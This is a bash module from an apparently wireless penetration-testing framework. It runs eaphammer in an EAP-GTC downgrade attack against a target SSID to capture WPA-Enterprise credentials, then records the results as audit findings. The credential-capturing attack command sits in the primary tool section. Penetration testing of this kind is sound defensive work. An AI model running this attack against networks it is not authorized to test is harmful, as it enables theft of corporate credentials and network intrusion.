#!/usr/bin/env bash
# MODULE_META
# NAME="WPA-Enterprise / EAP Attack"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="eaphammer"
# DESC="Test for EAP-level vulnerabilities (GTC downgrade, certificate validation bypass)"
# REQS="monitor_iface,target_ssid"
# PCAP="yes"
# TIMED="yes"
# DECODE="eap"

#===============================================================================
#  modules/d5_eap_attack.sh
#  D5: WPA-Enterprise / EAP Attack (Golden Wrapper)
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
SCAN_TIME="${SCAN_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D5"
EAP_OUT="${EVIDENCE_DIR}/${TC_ID}_eaphammer_results.txt"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] MONITOR_INTERFACE not set."
    exit 1
fi

if [[ -z "$SSID" ]]; then
    echo "[!] GUEST_SSID not set. EAP testing requires a target SSID."
    exit 1
fi

echo "[*] Starting WPA-Enterprise / EAP tests against ${SSID}..."

# 1. Start Telemetry in Background
(
    ELAPSED=0
    while true; do
        PCT=$(( 10 + (ELAPSED % 85) ))
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing EAP attack..."
        sleep 5; ELAPSED=$((ELAPSED + 5))
    done
) &
TEL_PID=$!

# 2. Run Primary Tool (eaphammer)
RET=0
if command -v eaphammer &>/dev/null; then
    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
        # Foreground Execution
        timeout --foreground "$SCAN_TIME" eaphammer --interface "$INTERFACE" --essid "$SSID" --negotiate gtc --auth wpa2-aes 2>&1 | tee "$EAP_OUT" || true
        RET=$?
    else
        # Background Execution
        timeout --foreground "$SCAN_TIME" eaphammer --interface "$INTERFACE" --essid "$SSID" --negotiate gtc --auth wpa2-aes > "$EAP_OUT" 2>&1 &
        TOOL_PID=$!
        wait $TOOL_PID; RET=$?
    fi
else
    echo "[!] eaphammer tool not found."
    RET=1
fi

# 3. Cleanup and Final Signal
kill $TEL_PID 2>/dev/null || true

# Reporting
if [[ $RET -eq 0 ]] && [[ -f "$EAP_OUT" ]]; then
    if grep -qiE "captured|credential|password|hash" "$EAP_OUT" 2>/dev/null; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "EAP Credential Captured" \
            --desc "Successfully captured WPA-Enterprise credentials via EAP-GTC downgrade against SSID ${SSID}." \
            --severity CRITICAL \
            --evidence "$EAP_OUT" \
            --rationale "Capturing EAP credentials allows for unauthorized access to corporate networks."
    else
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[$TC_ID] Audit Complete" \
            --desc "Executed EAP-GTC downgrade attack against SSID ${SSID}. No credentials intercepted." \
            --severity INFO \
            --evidence "$EAP_OUT" \
            --rationale "Enterprise-grade security requires proper EAP configuration."
    fi
else
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Skipped" \
        --desc "The eaphammer tool is missing or failed." \
        --severity INFO \
        --evidence "$EVIDENCE_DIR" \
        --rationale "EAP testing requires specialized tools."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
exit $RET
